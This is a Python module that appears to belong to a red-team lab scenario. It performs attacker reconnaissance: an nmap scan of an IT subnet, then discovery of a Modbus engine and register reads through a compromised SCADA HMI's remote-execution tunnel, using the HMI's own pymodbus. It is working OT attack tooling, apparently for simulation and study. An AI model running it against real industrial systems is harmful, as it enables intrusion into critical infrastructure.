#!/usr/bin/env python3
"""recon.py — the attacker's reconnaissance: it does not hand-roll scanners, it
drives real tools and reads the OS, then reports what it found as data.

Two stages, each matching what the attacker can actually reach:
  scan_it     on the attacker's own box: run nmap against the IT subnet and parse
              its XML → hosts, open ports, services (finds the HMI's web app).
  discover_ot through the foothold on the HMI (living off the land): read the
              HMI's /proc/net/tcp to learn the engine's address from its existing
              Modbus connections, then use the HMI's own pymodbus to confirm the
              Modbus service and read the holding registers — no scanner is ever
              dropped on the victim.

Copied flat onto the attacker node (kathara/redteam image: python3 + nmap) with
belief_tree.py, red_recon_agent.py and the exploit chain (see the scenario's
guest_files.py). Stdlib only; nmap is a subprocess, pymodbus runs on the HMI.
"""

import json
import socket
import struct
import subprocess
import xml.etree.ElementTree as ET

import ot_registers as reg

NMAP_TIMEOUT_S = 180.0


def run_nmap(cidr, ports):
    """-> nmap XML (stdout). Service/version scan of ``ports`` over ``cidr``."""
    cmd = ["nmap", "-sV", "-p", ",".join(str(p) for p in ports), "-oX", "-", cidr]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=NMAP_TIMEOUT_S)
    return p.stdout


def parse_nmap_xml(xml_text):
    """nmap's -oX output -> [{"ip", "ports": [{"port", "service", "product"}]}].

    Only open ports are kept — a closed port is not a finding."""
    hosts = []
    try:
        root = ET.fromstring(xml_text or "")
    except ET.ParseError:
        return hosts
    for h in root.findall("host"):
        addr = h.find("address[@addrtype='ipv4']")
        if addr is None:
            continue
        open_ports = []
        for port in h.findall("ports/port"):
            state = port.find("state")
            if state is None or state.get("state") != "open":
                continue
            svc = port.find("service")
            open_ports.append(
                {
                    "port": int(port.get("portid")),
                    "service": (svc.get("name") if svc is not None else None),
                    "product": (svc.get("product") if svc is not None else None),
                }
            )
        if open_ports:
            hosts.append({"ip": addr.get("addr"), "ports": open_ports})
    return hosts


def scan_it(cidr, ports, run=run_nmap):
    """Discover IT hosts/services with nmap. Returns the parsed host list; the
    foothold is any host exposing an HTTP service (the vulnerable web app)."""
    return parse_nmap_xml(run(cidr, ports))


def remote_ips_to_port(proc_net_tcp, port):
    """IPs this host holds connections to on ``port``, read from /proc/net/tcp.

    Addresses there are hex, little-endian per byte (so 0100007F == 127.0.0.1);
    the remote endpoint is the 3rd column ("IP:PORT")."""
    found = []
    for line in (proc_net_tcp or "").splitlines()[1:]:  # skip the header row
        cols = line.split()
        if len(cols) < 3 or ":" not in cols[2]:
            continue
        hex_ip, hex_port = cols[2].split(":")
        try:
            if int(hex_port, 16) != port:
                continue
            ip = socket.inet_ntoa(struct.pack("<I", int(hex_ip, 16)))
        except (ValueError, struct.error, OSError):
            continue
        if ip not in found:
            found.append(ip)
    return found


def _read_registers_cmd(engine_ip, port, addrs):
    """A one-liner that reads holding registers on the HMI with ITS pymodbus and
    prints one JSON line {addr: raw}. Living off the land: the SCADA box already
    has pymodbus; nothing is dropped on it."""
    want = ",".join(str(a) for a in addrs)
    count = max(addrs) + 1 if addrs else 0
    return (
        'python3 -c "'
        "import json;from pymodbus.client import ModbusTcpClient as C;"
        f"c=C('{engine_ip}',port={port});c.connect();"
        f"r=c.read_holding_registers({min(addrs) if addrs else 0},"
        f"count={count - (min(addrs) if addrs else 0)},slave={reg.UNIT_ID});"
        "import sys;"
        "print(json.dumps({} if r.isError() else "
        f"{{a:r.registers[a-{min(addrs) if addrs else 0}] for a in [{want}]}}));"
        'c.close()" 2>/dev/null'
    )


def discover_ot(run_cmd, candidate_port=reg.MODBUS_PORT):
    """Living-off-the-land OT recon from the compromised HMI. ``run_cmd(cmd)`` runs
    a shell command on the HMI (the RCE tunnel). Returns:

        {"engine_ip", "modbus_port", "modbus_ok", "registers": {addr: raw}}

    or {} if no Modbus engine could be reached from the HMI."""
    proc = run_cmd("cat /proc/net/tcp 2>/dev/null")
    engines = remote_ips_to_port(proc, candidate_port)
    if not engines:
        return {}
    engine_ip = engines[0]
    addrs = sorted(reg.ACTUATOR_REGISTERS)  # the holding registers worth reading
    out = run_cmd(_read_registers_cmd(engine_ip, candidate_port, addrs))
    registers = {}
    for line in (out or "").splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            registers = {int(k): v for k, v in json.loads(line).items()}
            break
        except (ValueError, AttributeError):
            continue
    return {
        "engine_ip": engine_ip,
        "modbus_port": candidate_port,
        "modbus_ok": bool(registers),
        "registers": registers,
    }
